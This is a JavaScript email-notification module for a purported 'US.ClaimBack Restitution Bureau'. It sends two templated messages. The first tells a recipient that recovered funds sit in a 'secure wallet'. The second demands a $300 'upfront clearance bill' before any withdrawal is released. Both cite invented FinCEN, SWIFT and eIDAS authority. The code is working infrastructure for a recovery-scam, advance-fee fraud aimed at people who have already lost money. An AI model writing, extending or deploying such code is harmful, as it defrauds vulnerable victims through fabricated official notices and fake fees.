import nodemailer from 'nodemailer';

/**
 * US.ClaimBack Institutional Email Notification Service
 * Configured for domain: claimback.us / active domain
 */

const DOMAIN_NAME = process.env.DOMAIN_NAME || 'usclaimback.com';
const APP_URL = process.env.APP_URL || `https://${DOMAIN_NAME}`;
const SMTP_FROM_NAME = process.env.SMTP_FROM_NAME || 'US.ClaimBack Restitution Bureau';
const SMTP_FROM_EMAIL = process.env.SMTP_FROM_EMAIL || `settlements@${DOMAIN_NAME}`;

/**
 * Build or verify nodemailer transporter
 */
function getTransporter() {
  const host = process.env.SMTP_HOST;
  const user = process.env.SMTP_USER;
  const pass = process.env.SMTP_PASS;
  const port = parseInt(process.env.SMTP_PORT || '587', 10);
  const secure = process.env.SMTP_SECURE === 'true' || port === 465;

  // If credentials are missing or default placeholders, return null to trigger mock/console mode
  if (!host || !user || !pass || pass === 'your_email_password_here' || host.includes('example.com')) {
    return null;
  }

  return nodemailer.createTransport({
    host,
    port,
    secure,
    auth: { user, pass },
    tls: { rejectUnauthorized: false }
  });
}

/**
 * Dispatch an email with Resend API (Primary) -> Nodemailer SMTP -> Console Simulation
 */
async function sendMail({ to, subject, html, text, fromTitle = SMTP_FROM_NAME, fromEmail = SMTP_FROM_EMAIL }) {
  const fromAddress = `"${fromTitle}" <${fromEmail}>`;

  // 1. Primary: Resend API (reads securely from process.env.RESEND_API_KEY)
  const resendApiKey = process.env.RESEND_API_KEY;
  if (resendApiKey) {
    try {
      const response = await fetch('https://api.resend.com/emails', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${resendApiKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          from: `${fromTitle} <${fromEmail}>`,
          to: Array.isArray(to) ? to : [to],
          subject,
          html,
          text: text || ''
        })
      });

      const resData = await response.json();
      if (response.ok && resData.id) {
        console.log(`[RESEND EMAIL DISPATCHED] To: ${to} | Subject: "${subject}" | Id: ${resData.id}`);
        return { success: true, messageId: resData.id, mode: 'resend' };
      } else {
        console.error(`[RESEND EMAIL WARNING]:`, resData);
      }
    } catch (err) {
      console.error(`[RESEND EXCEPTION]:`, err.message);
    }
  }

  // 2. Secondary: Nodemailer SMTP
  const transporter = getTransporter();
  if (transporter) {
    try {
      const info = await transporter.sendMail({
        from: fromAddress,
        to,
        subject,
        text,
        html
      });
      console.log(`[EMAIL DISPATCHED] To: ${to} | Subject: "${subject}" | MessageId: ${info.messageId}`);
      return { success: true, messageId: info.messageId, mode: 'live' };
    } catch (err) {
      console.error(`[EMAIL ERROR] Failed sending to ${to} via SMTP:`, err.message);
      // Fallback to simulated log if SMTP fails
    }
  }

  // Simulated fallback mode (Active until domain & live SMTP credentials are configured)
  console.log('\n========================================================================');
  console.log(`[SIMULATED EMAIL DISPATCH - PENDING DOMAIN ACTIVATION (${DOMAIN_NAME})]`);
  console.log(`FROM:    ${fromAddress}`);
  console.log(`TO:      ${to}`);
  console.log(`SUBJECT: ${subject}`);
  console.log(`DATE:    ${new Date().toISOString()}`);
  console.log('------------------------------------------------------------------------');
  console.log(text || '(HTML Body Rendered)');
  console.log('========================================================================\n');

  return { success: true, simulated: true, domain: DOMAIN_NAME };
}

/**
 * 1. SETTLEMENT FUNDS RECEIVED NOTIFICATION
 * Sent when admin confirms / approves restitution settlement for the case.
 */
export async function sendSettlementNotificationEmail({ user, caseDoc, amount }) {
  if (!user || !user.email) return;

  const recipientEmail = user.email;
  const claimantName = user.fullName || user.name || 'Valued Member';
  const cNum = caseDoc?.caseNumber || 'RG-10482';
  const formattedAmount = Number(amount || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  const dateStr = new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
  const dashboardUrl = `${APP_URL}/portal/dashboard`;

  const subject = `Official Notice: Restitution Settlement of $${formattedAmount} USD Credited - Case #${cNum}`;

  const textBody = `
US.CLAIMBACK RESTITUTION & DISPUTE BUREAU (${DOMAIN_NAME})
OFFICIAL SETTLEMENT NOTIFICATION

Dear ${claimantName},

We are pleased to formally notify you that dispute recovery funds in the amount of $${formattedAmount} USD have been successfully secured and credited to your secure member dispute wallet under Case #${cNum}.

SETTLEMENT SUMMARY:
- Case Reference ID: #${cNum}
- Recovered Restitution Amount: $${formattedAmount} USD
- Credited To: Member Secure Wallet (eIDAS Vault)
- Settlement Date: ${dateStr}
- Status: Funds Recovered & Credited

When you log in to your US.ClaimBack dashboard, your updated balance will be visible and ready for disbursement verification.

Access your dashboard and member wallet here:
${dashboardUrl}

Sincerely,
Senior Dispute Specialist Sarah K.
US.ClaimBack Financial Restitution Bureau
https://${DOMAIN_NAME}
`.trim();

  const htmlBody = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f1f5f9; margin: 0; padding: 24px; color: #0f172a; }
    .container { max-width: 600px; margin: 0 auto; background: #ffffff; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.06); border: 1px solid #e2e8f0; }
    .header { background: #0f172a; padding: 28px 32px; text-align: left; }
    .header-logo { font-size: 20px; font-weight: 800; color: #ffffff; letter-spacing: -0.5px; }
    .header-logo span { color: #10b981; }
    .header-subtitle { color: #94a3b8; font-size: 12px; margin-top: 4px; text-transform: uppercase; letter-spacing: 1px; }
    .content { padding: 36px 32px; }
    .badge { display: inline-block; background: #ecfdf5; color: #065f46; border: 1px solid #a7f3d0; font-size: 11px; font-weight: 800; padding: 4px 10px; border-radius: 6px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 16px; }
    .title { font-size: 24px; font-weight: 800; color: #0f172a; margin: 0 0 12px; line-height: 1.25; }
    .amount-box { background: linear-gradient(135deg, #f0fdf4 0%, #ecfdf5 100%); border: 1.5px solid #6ee7b7; border-radius: 12px; padding: 24px; text-align: center; margin: 24px 0; }
    .amount-label { font-size: 12px; font-weight: 700; color: #047857; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
    .amount-number { font-size: 34px; font-weight: 900; color: #065f46; letter-spacing: -1px; }
    .amount-sub { font-size: 13px; color: #059669; font-weight: 600; margin-top: 6px; }
    .details-table { width: 100%; border-collapse: collapse; margin: 24px 0; font-size: 14px; }
    .details-table td { padding: 12px 0; border-bottom: 1px solid #f1f5f9; }
    .details-table td.label { color: #64748b; font-weight: 500; width: 40%; }
    .details-table td.value { color: #0f172a; font-weight: 700; text-align: right; }
    .cta-btn { display: inline-block; background: #059669; color: #ffffff !important; text-decoration: none; padding: 14px 28px; border-radius: 8px; font-weight: 700; font-size: 15px; margin-top: 12px; text-align: center; }
    .footer { background: #f8fafc; padding: 24px 32px; border-top: 1px solid #e2e8f0; font-size: 12px; color: #64748b; line-height: 1.6; }
    .footer p { margin: 4px 0; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="header-logo"><img src="${APP_URL}/logo.png" width="30" height="30" style="vertical-align: middle; margin-right: 10px; border-radius: 7px;" alt="US.ClaimBack Emblem" />US.<span>ClaimBack</span></div>
      <div class="header-subtitle">Interbank Restitution & Fraud Recovery Division &bull; ${DOMAIN_NAME}</div>
    </div>
    <div class="content">
      <div class="badge">&#10003; Settlement Credit Confirmed</div>
      <h1 class="title">Restitution Funds Credited</h1>
      <p style="font-size: 15px; line-height: 1.5; color: #334155; margin-bottom: 16px;">
        Dear <strong>${claimantName}</strong>,
      </p>
      <p style="font-size: 15px; line-height: 1.5; color: #334155;">
        We are pleased to inform you that our dispute resolution department has finalized the recovery audit. Settlement funds have been formally credited to your secure member wallet.
      </p>

      <div class="amount-box">
        <div class="amount-label">Recovered Restitution Credited</div>
        <div class="amount-number">$${formattedAmount} <span style="font-size: 20px; font-weight: 700;">USD</span></div>
        <div class="amount-sub">&#10003; Credited to Case #${cNum} &bull; Insured eIDAS Vault</div>
      </div>

      <table class="details-table">
        <tr>
          <td class="label">Dispute File Reference:</td>
          <td class="value">#${cNum}</td>
        </tr>
        <tr>
          <td class="label">Beneficiary / Claimant:</td>
          <td class="value">${claimantName}</td>
        </tr>
        <tr>
          <td class="label">Settlement Date:</td>
          <td class="value">${dateStr}</td>
        </tr>
        <tr>
          <td class="label">Available Payout Methods:</td>
          <td class="value">Bank Wire, Crypto (USDT), Card Direct</td>
        </tr>
        <tr>
          <td class="label">Dispute Status:</td>
          <td class="value" style="color: #059669;">Settlement Granted</td>
        </tr>
      </table>

      <p style="font-size: 14px; line-height: 1.5; color: #475569;">
        When you return to your member dashboard, your recovered balance will be displayed on your secure wallet board. You may proceed to initiate your payout verification.
      </p>

      <div style="text-align: center; margin: 28px 0 12px;">
        <a href="${dashboardUrl}" class="cta-btn">Access Member Dashboard & Wallet &rarr;</a>
      </div>
    </div>

    <div class="footer">
      <p><strong>US.ClaimBack Financial Restitution Bureau</strong></p>
      <p>Official banking communication issued under FinCEN & SWIFT Interbank Guidelines. Registered domain: ${DOMAIN_NAME}.</p>
      <p>This automated message was sent to ${recipientEmail} regarding active dispute file #${cNum}.</p>
    </div>
  </div>
</body>
</html>
`.trim();

  return sendMail({
    to: recipientEmail,
    subject,
    text: textBody,
    html: htmlBody,
    fromTitle: 'US.ClaimBack Settlement Bureau',
    fromEmail: `settlements@${DOMAIN_NAME}`
  });
}

/**
 * 2. $300 UPFRONT CLEARANCE BILL NOTICE
 * Sent when claimant attempts withdrawal before $300 clearance has been approved by admin.
 */
export async function sendClearanceBillEmail({ user, caseDoc, amount, billNumber }) {
  if (!user || !user.email) return;

  const recipientEmail = user.email;
  const claimantName = user.fullName || user.name || 'Valued Member';
  const cNum = caseDoc?.caseNumber || 'RG-10482';
  const formattedPayout = Number(amount || caseDoc?.settledAmount || caseDoc?.disputedAmount || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  const billId = billNumber || `INV-CLR-${Math.floor(1000 + Math.random() * 9000)}`;
  const dateStr = new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
  const dashboardUrl = `${APP_URL}/portal/dashboard`;

  const subject = `Action Required: $300 Upfront Clearance Bill for Payout Authorization - Case #${cNum}`;

  const textBody = `
US.CLAIMBACK COMPLIANCE & ESCROW DIVISION (${DOMAIN_NAME})
MANDATORY CLEARANCE NOTICE

Dear ${claimantName},

You have initiated a withdrawal request for the recovered settlement of $${formattedPayout} USD under Dispute Case #${cNum}.

Pursuant to interbank cross-border restitution regulations and anti-money laundering (AML) compliance protocols, an upfront administrative clearance bill of $300.00 USD is required before the disbursement can be released to your designated account.

CLEARANCE BILL DETAILS:
- Case Reference ID: #${cNum}
- Clearance Bill Number: #${billId}
- Requested Payout Amount: $${formattedPayout} USD
- Required Upfront Clearance Fee: $300.00 USD
- Issuing Authority: Interbank AML Escrow Release Protocol (FinCEN & SWIFT Reg. #CLR-882)
- Date Issued: ${dateStr}
- Current Status: Awaiting $300 Bill Settlement & Administrative Authorization

Please complete the $300 clearance bill payment through your member dashboard or contact your assigned case analyst. Once the payment has been confirmed and authorized by administration, your withdrawal will be immediately unlocked.

Access your dashboard to view the bill and proceed:
${dashboardUrl}

Sincerely,
Compliance & Escrow Clearance Office
US.ClaimBack Global Restitution Network
https://${DOMAIN_NAME}
`.trim();

  const htmlBody = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f1f5f9; margin: 0; padding: 24px; color: #0f172a; }
    .container { max-width: 600px; margin: 0 auto; background: #ffffff; border-radius: 16px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.06); border: 1px solid #e2e8f0; }
    .header { background: #0f172a; padding: 28px 32px; text-align: left; }
    .header-logo { font-size: 20px; font-weight: 800; color: #ffffff; letter-spacing: -0.5px; }
    .header-logo span { color: #10b981; }
    .header-subtitle { color: #94a3b8; font-size: 12px; margin-top: 4px; text-transform: uppercase; letter-spacing: 1px; }
    .content { padding: 36px 32px; }
    .badge { display: inline-block; background: #fffbeb; color: #b45309; border: 1px solid #fde68a; font-size: 11px; font-weight: 800; padding: 4px 10px; border-radius: 6px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 16px; }
    .title { font-size: 24px; font-weight: 800; color: #0f172a; margin: 0 0 12px; line-height: 1.25; }
    .notice-card { background: #fffbeb; border: 1.5px solid #fde68a; border-radius: 12px; padding: 20px 24px; margin: 20px 0; }
    .notice-title { font-size: 14px; font-weight: 800; color: #92400e; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 6px; }
    .notice-text { font-size: 14px; color: #78350f; line-height: 1.5; margin: 0; }
    .details-table { width: 100%; border-collapse: collapse; margin: 24px 0; font-size: 14px; }
    .details-table td { padding: 12px 0; border-bottom: 1px solid #f1f5f9; }
    .details-table td.label { color: #64748b; font-weight: 500; width: 45%; }
    .details-table td.value { color: #0f172a; font-weight: 700; text-align: right; }
    .fee-highlight { font-size: 18px; font-weight: 900; color: #b45309; }
    .cta-btn { display: inline-block; background: #0f172a; color: #ffffff !important; text-decoration: none; padding: 14px 28px; border-radius: 8px; font-weight: 700; font-size: 15px; margin-top: 12px; text-align: center; }
    .footer { background: #f8fafc; padding: 24px 32px; border-top: 1px solid #e2e8f0; font-size: 12px; color: #64748b; line-height: 1.6; }
    .footer p { margin: 4px 0; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <div class="header-logo"><img src="${APP_URL}/logo.png" width="30" height="30" style="vertical-align: middle; margin-right: 10px; border-radius: 7px;" alt="US.ClaimBack Emblem" />US.<span>ClaimBack</span></div>
      <div class="header-subtitle">Compliance, Escrow & Restitution Clearance &bull; ${DOMAIN_NAME}</div>
    </div>
    <div class="content">
      <div class="badge">&#9888; Mandatory Clearance Required</div>
      <h1 class="title">Action Required: $300 Upfront Clearance Bill</h1>
      <p style="font-size: 15px; line-height: 1.5; color: #334155; margin-bottom: 16px;">
        Dear <strong>${claimantName}</strong>,
      </p>
      <p style="font-size: 15px; line-height: 1.5; color: #334155;">
        You have requested a withdrawal of your recovered dispute funds under Case <strong>#${cNum}</strong>.
      </p>

      <div class="notice-card">
        <div class="notice-title">Compliance Mandate Notice</div>
        <p class="notice-text">
          Under interbank restitution release protocols, an upfront administrative clearance bill of <strong>$300.00 USD</strong> must be settled and verified before funds can be released to your designated payout channel.
        </p>
      </div>

      <table class="details-table">
        <tr>
          <td class="label">Dispute File Reference:</td>
          <td class="value">#${cNum}</td>
        </tr>
        <tr>
          <td class="label">Clearance Invoice Reference:</td>
          <td class="value">#${billId}</td>
        </tr>
        <tr>
          <td class="label">Disbursement Amount Requested:</td>
          <td class="value">$${formattedPayout} USD</td>
        </tr>
        <tr>
          <td class="label">Mandatory Clearance Fee:</td>
          <td class="value fee-highlight">$300.00 USD</td>
        </tr>
        <tr>
          <td class="label">Regulatory Authority:</td>
          <td class="value">SWIFT & FinCEN AML Protocol #CLR-882</td>
        </tr>
        <tr>
          <td class="label">Withdrawal Status:</td>
          <td class="value" style="color: #b45309;">Pending $300 Admin Authorization</td>
        </tr>
      </table>

      <p style="font-size: 14px; line-height: 1.5; color: #475569;">
        Please log in to your US.ClaimBack member dashboard to view instructions on submitting proof for your $300 clearance bill. Once your payment is verified by administration, your withdrawal will be immediately unlocked.
      </p>

      <div style="text-align: center; margin: 28px 0 12px;">
        <a href="${dashboardUrl}" class="cta-btn">View Clearance Bill in Dashboard &rarr;</a>
      </div>
    </div>

    <div class="footer">
      <p><strong>US.ClaimBack Compliance & Escrow Bureau</strong></p>
      <p>Cross-Border Interbank Restitution Network &bull; Registered Domain: ${DOMAIN_NAME}.</p>
      <p>This official notice was dispatched to ${recipientEmail} regarding dispute file #${cNum}.</p>
    </div>
  </div>
</body>
</html>
`.trim();

  return sendMail({
    to: recipientEmail,
    subject,
    text: textBody,
    html: htmlBody,
    fromTitle: 'US.ClaimBack Compliance & Escrow',
    fromEmail: `clearance@${DOMAIN_NAME}`
  });
}

export default {
  sendSettlementNotificationEmail,
  sendClearanceBillEmail
};
